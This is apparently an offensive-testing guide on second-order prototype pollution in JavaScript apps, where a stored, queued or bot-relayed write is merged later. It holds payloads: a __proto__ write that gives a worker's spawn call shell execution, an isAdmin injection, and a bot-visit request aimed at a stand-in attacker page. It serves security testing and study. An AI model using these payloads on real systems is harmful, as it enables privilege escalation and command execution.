# Second-order pollution — stored writes, delayed reads, relayed carriers

The write doesn't always fire on the request that carries it. A
stored JSON profile merged on next-login, a queued job merged on
execution, a bot-relayed request merged in the bot's context — the
read happens in a different request, process, or principal.

---

## 1. The shapes

```
1. stored-profile:    POST /profile (JSON merge) → stored → next
   request's render merges the stored blob → the polluted name
   rides into the render options
2. queued-job:        POST /jobs {payload} → stored → a worker
   process merges the job config → pollution in the WORKER's proto
3. bot-relayed:       POST /bot-visit {url} → bot fetches + merges
   the page's data → pollution inside the BOT's context (the
   tornadoservice card's shape)
4. config-reload:     POST /config {blob} → stored → a later
   reload/restart merges it → pollution after restart
5. template-store:    POST /templates {opts} → stored → render
   merges saved opts → template-option pollution
6. session-object:    session.cfg merged at login → pollution
   persists for the session's lifetime
7. cache-poisoned:    a polluted option cached → every read of
   that cache key returns polluted-context results
8. shared-fixture:    a shared config object mutated once → all
   subsequent reads inherit
```

## 2. The bot-relayed carrier — the tornadoservice card

```
attacker → POST /bot/visit {url: attacker-page}
bot      → fetches the page; the page's form/JSON carries the write
bot      → the bot's own request handler merges the page data
           INTO the bot-side object → pollution in the BOT process
read     → a bot-side endpoint's fallback reads the polluted name
```

The write lands in the bot's process, not yours — the readback
oracle must be a BOT-side behavior (the bot's response, a bot
action, an endpoint the bot's role can reach). The card's detail:
the bot's request handler forwarded the form's fields to a class-
attr setter — `__class__`-shaped keys polluted the bot's session
class.

## 3. The queued-job shape

```js
// the job config is JSON-merged in the worker
// POST /jobs {"type":"render","opts":{"__proto__":{"shell":true}}}
// worker: spawn('render', args, job.opts) — 'shell' inherited
```

The worker is a DIFFERENT process — pollution lands in ITS proto,
not the web process's. The readback is the job's output/status —
the marker needs to survive into the job result (`outputFunctionName`
writing `PP` into the rendered output, an env var affecting the
child's stderr, etc.).

## 4. The stored-profile shape

```js
// POST /profile saves a JSON blob; GET /dashboard merges it into
// the render context's options
// write: {"theme":{"__proto__":{"isAdmin":true}}} stored as profile.theme
// read: GET /dashboard → merged opts.isAdmin reads your value
```

The carrier is the profile-store endpoint; the read is a different
endpoint's merge. The write and the sink can be on entirely
different routes — map them both.

## 5. The session-fixture shape

```js
// a session object persisted per-user
// write: login-time merge of a stored settings blob into session.cfg
// read: every subsequent request reads session.cfg.*
```

`session` objects are usually `req.session` — a plain object —
a polluted name there is per-session, not process-global — a
narrower blast radius (only YOUR session sees it) which makes it
the SAFEST test surface: no cross-user impact.

## 6. The reload-triggered shape

```js
// write: POST /config {"a":{"__proto__":{"x":1}}} → stored to disk
// trigger: POST /admin/reload OR wait for the tick/restart
// the merge runs at reload-time in a fresh process/context
```

A delayed write — the pollution doesn't exist until the reload.
The oracle: the behavior pre/post-reload differs on the polluted
name.

## 7. The timing implications

- The write's evidence isn't in the write-request's response —
  it's in a LATER request's behavior. Don't judge the write dead
  because the POST returned `{"ok":true}` without the marker; read
  the consuming endpoint.
- The consuming endpoint must be identified BEFORE judging the
  write — the read-site is the oracle, not the write-response.
- Process-per-request workers (serverless, per-request `fork`)
  RESET pollution between requests — a second-order write lands
  only if it persists in shared state (disk, DB, a long-lived
  worker).

## 8. The readback across principals

```js
// a pollution write that lands in ANOTHER user's/process's context
// can't be read back from your own request — you need:
//   - an endpoint the polluted context exposes to you (bot status)
//   - an OOB signal (the polluted context's outbound request)
//   - a stored marker in shared state (a written file, a DB field)
```

The bot's `visit` status endpoint, an admin's `/debug` output the
bot's role triggers, a written `/tmp/x` file on the shared fs —
the cross-principal oracles.

## 9. Probing second-order

```bash
# 1. map the write endpoint and the consuming endpoint
POST /profile {"theme":{"__proto__":{"ppmarker":"v1"}}}  → stored
GET  /dashboard                                        → reads it?

# 2. the same pair for a job
POST /jobs {"opts":{"__proto__":{"ppmarker":"v1"}}}      → queued
GET  /jobs/<id>                                        → status shows?

# 3. the bot-relay
POST /bot/visit {"url":"http://attacker/p"}              → bot merges?
GET  /bot/status or the bot's visible action             → reads it?

# 4. reload-triggered
POST /config {"a":{"__proto__":{"ppmarker":"v1"}}}       → stored
POST /admin/reload                                     → triggers merge
GET  /that-reads-config                                → marker fires?
```

## 10. The falsifiers

- The stored blob isn't merged — it's stored verbatim and returned
  verbatim (a pass-through, not a merge).
- The consuming path runs in a fresh process per request — the
  write evaporates.
- The merge happens but the polluted name is never read — same
  no-sink falsifier as first-order.
- The write lands but the consuming principal is unreachable —
  no oracle exists. Inconclusive, not refuted — record and park.

## 11. Ledger

```bash
python3 tools/state.py <c> --hypothesis "second-order: stored profile -> dashboard merge"
# refutes when: the store is pass-through; or the consumer is a
# fresh process; or the polluted name isn't read on the consume path
```
